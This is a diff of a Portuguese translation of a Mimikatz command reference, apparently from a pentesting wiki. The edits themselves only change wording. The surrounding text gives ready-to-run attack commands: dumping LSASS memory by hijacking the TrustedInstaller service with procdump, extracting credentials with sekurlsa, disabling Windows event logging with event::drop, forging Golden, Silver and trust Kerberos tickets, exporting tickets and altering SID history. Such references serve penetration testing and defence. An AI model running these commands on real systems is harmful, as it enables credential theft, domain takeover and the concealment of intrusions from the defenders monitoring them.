@@ -28,7 +28,7 @@ Aprofunde sua experiência em **Segurança Móvel** com a 8kSec Academy. Domine 
 
 A partir do Windows 8.1 e Windows Server 2012 R2, medidas significativas foram implementadas para proteger contra o roubo de credenciais:
 
-- **Hashes LM e senhas em texto claro** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com um valor DWORD de `0` para desativar a Autenticação Digest, garantindo que senhas "em texto claro" não sejam armazenadas em cache no LSASS.
+- **LM hashes e senhas em texto claro** não são mais armazenados na memória para aumentar a segurança. Uma configuração específica do registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, deve ser configurada com um valor DWORD de `0` para desativar a Autenticação Digest, garantindo que senhas "em texto claro" não sejam armazenadas em cache no LSASS.
 
 - **Proteção LSA** é introduzida para proteger o processo da Autoridade de Segurança Local (LSA) contra leitura não autorizada de memória e injeção de código. Isso é alcançado marcando o LSASS como um processo protegido. A ativação da Proteção LSA envolve:
 1. Modificar o registro em _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ definindo `RunAsPPL` para `dword:00000001`.
@@ -43,7 +43,7 @@ Administradores normalmente têm SeDebugPrivilege, permitindo que eles depurem p
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Isso permite o despejo da memória do `lsass.exe` para um arquivo, que pode então ser analisado em outro sistema para extrair credenciais:
+Isso permite o despejo da memória do `lsass.exe` em um arquivo, que pode então ser analisado em outro sistema para extrair credenciais:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -51,21 +51,22 @@ Isso permite o despejo da memória do `lsass.exe` para um arquivo, que pode ent�
 ```
 ## Mimikatz Options
 
-A manipulação de logs de eventos no Mimikatz envolve duas ações principais: limpar logs de eventos e corrigir o serviço de Eventos para evitar o registro de novos eventos. Abaixo estão os comandos para realizar essas ações:
+A manipulação de logs de eventos no Mimikatz envolve duas ações principais: limpar logs de eventos e patchar o serviço de Eventos para evitar o registro de novos eventos. Abaixo estão os comandos para realizar essas ações:
 
 #### Clearing Event Logs
 
 - **Command**: Esta ação tem como objetivo deletar os logs de eventos, dificultando o rastreamento de atividades maliciosas.
-- O Mimikatz não fornece um comando direto em sua documentação padrão para limpar logs de eventos diretamente via sua linha de comando. No entanto, a manipulação de logs de eventos geralmente envolve o uso de ferramentas de sistema ou scripts fora do Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou Visualizador de Eventos do Windows).
+- Mimikatz não fornece um comando direto em sua documentação padrão para limpar logs de eventos diretamente via sua linha de comando. No entanto, a manipulação de logs de eventos geralmente envolve o uso de ferramentas de sistema ou scripts fora do Mimikatz para limpar logs específicos (por exemplo, usando PowerShell ou Visualizador de Eventos do Windows).
 
 #### Experimental Feature: Patching the Event Service
 
 - **Command**: `event::drop`
 - Este comando experimental é projetado para modificar o comportamento do Serviço de Registro de Eventos, efetivamente impedindo-o de registrar novos eventos.
-- Exemplo: `mimikatz "privilege::debug" "event::drop" exit`
+- Example: `mimikatz "privilege::debug" "event::drop" exit`
 
 - O comando `privilege::debug` garante que o Mimikatz opere com os privilégios necessários para modificar serviços do sistema.
-- O comando `event::drop` então corrige o serviço de Registro de Eventos.
+- O comando `event::drop` então patcha o serviço de Registro de Eventos.
+
 
 ### Kerberos Ticket Attacks
 
@@ -82,7 +83,7 @@ Um Golden Ticket permite a impersonação de acesso em todo o domínio. Comando 
 - `/ptt`: Injeta diretamente o ticket na memória.
 - `/ticket`: Salva o ticket para uso posterior.
 
-Exemplo:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
@@ -101,7 +102,7 @@ mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-12345678
 ```
 ### Criação de Ticket de Confiança
 
-Os Tickets de Confiança são usados para acessar recursos entre domínios aproveitando relacionamentos de confiança. Comando e parâmetros principais:
+Tickets de Confiança são usados para acessar recursos entre domínios aproveitando relacionamentos de confiança. Comando e parâmetros principais:
 
 - Comando: Semelhante ao Golden Ticket, mas para relacionamentos de confiança.
 - Parâmetros:
@@ -114,7 +115,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 ```
 ### Comandos Adicionais do Kerberos
 
-- **Listando Tickets**:
+- **Listar Tickets**:
 - Comando: `kerberos::list`
 - Lista todos os tickets do Kerberos para a sessão do usuário atual.
 
@@ -183,7 +184,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Extrair tickets do Kerberos da memória.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipulação de SID e Token
+### Manipulação de Sid e Token
 
 - **SID::add/modify**: Alterar SID e SIDHistory.
 - Adicionar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
